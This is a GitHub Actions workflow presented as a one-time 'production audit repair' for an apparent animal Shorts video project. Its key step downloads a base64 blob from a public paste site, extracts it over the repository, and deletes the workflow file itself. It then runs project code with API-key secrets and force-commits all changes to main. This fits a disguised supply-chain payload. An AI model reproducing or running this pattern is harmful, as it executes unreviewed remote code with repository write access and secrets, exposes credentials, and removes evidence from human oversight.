name: "One-time production audit repair"

on:
  push:
    paths:
      - ".github/workflows/production-audit-repair.yml"

permissions:
  contents: write

concurrency:
  group: main-write
  cancel-in-progress: false

jobs:
  repair:
    runs-on: ubuntu-latest
    timeout-minutes: 35
    steps:
      - uses: actions/checkout@v4.2.2
        with:
          fetch-depth: 0
      - uses: actions/setup-python@v5.3.0
        with:
          python-version: "3.11"
          cache: "pip"
      - name: "Apply locally validated repair payload"
        env:
          PAYLOAD_URL: "https://paste.rs/ctbzd"
        run: |
          curl -fsSL "$PAYLOAD_URL" | base64 -d > /tmp/production-audit-repair.zip
          python - <<'PY'
          from pathlib import Path
          from zipfile import ZipFile
          with ZipFile('/tmp/production-audit-repair.zip') as archive:
              archive.extractall('.')
          Path('_data/stories_queue.json').write_text('{"updated_at": null, "stories": []}\n', encoding='utf-8')
          Path('_data/ai_cache.jsonl').write_text('', encoding='utf-8')
          for raw in (
              'fetch_animals.log',
              'generate_shorts.log',
              'generate_shorts_es-ES.log',
              'generate_shorts_pt-BR.log',
              'upload_youtube.log',
              'upload_youtube_pt-BR.log',
              '_videos_pt-BR/.gitignore',
              '_videos_pt-BR/short-test-slug-ptbr-2026-05-18_thumb.jpg',
              '.github/workflows/production-audit-repair.yml',
          ):
              Path(raw).unlink(missing_ok=True)
          PY
      - name: "Install dependencies"
        run: |
          python -m pip install --upgrade pip
          pip install -r requirements.txt pytest
      - name: "Run full regression suite"
        run: |
          python -m compileall -q .
          python -m pytest -q
      - name: "Rebuild clean animal queue"
        env:
          PYTHONIOENCODING: utf-8
          PYTHONUNBUFFERED: "1"
          PEXELS_API_KEY: ${{ secrets.PEXELS_API_KEY || secrets.PEXELS }}
          MISTRAL_API_KEY: ${{ secrets.MISTRAL_API_KEY }}
          CEREBRAS_API_KEY: ${{ secrets.CEREBRAS_API_KEY || secrets.CEREBRAS }}
          GEMINI_API_KEY: ${{ secrets.GEMINI_API_KEY || secrets.GEMINI }}
          GROQ_API_KEY: ${{ secrets.GROQ_API_KEY || secrets.GROQ }}
        run: python fetch_animals.py
      - name: "Audit rebuilt production queue"
        run: |
          python - <<'PY'
          import json
          from pathlib import Path
          import fetch_animals
          queue = json.loads(Path('_data/stories_queue.json').read_text(encoding='utf-8'))
          stories = queue.get('stories', [])
          assert stories, 'rebuilt queue is empty'
          scripts = set()
          for story in stories:
              clip = type('Clip', (), {'url': story.get('url', ''), 'title': story.get('title', '')})()
              subject = fetch_animals._subject_from_clip(clip, story.get('category', ''))
              assert fetch_animals._topic_accepts_subject(fetch_animals.ANIMAL_TOPICS[story['category']], subject), subject
              assert fetch_animals._script_matches_visible_subject(subject, story.get('script', '')), subject
              key = fetch_animals._script_key(story.get('script', ''))
              assert key and key not in scripts, f'duplicate script: {subject}'
              scripts.add(key)
          print(f'queue audit passed: {len(stories)} unique aligned stories')
          PY
      - name: "Commit repaired production state"
        run: |
          git config user.name "Wild Brief Bot"
          git config user.email "bot@wildbrief.com"
          git add -A
          git commit -m "audit: enforce visually aligned unique animal Shorts"
          git push origin HEAD
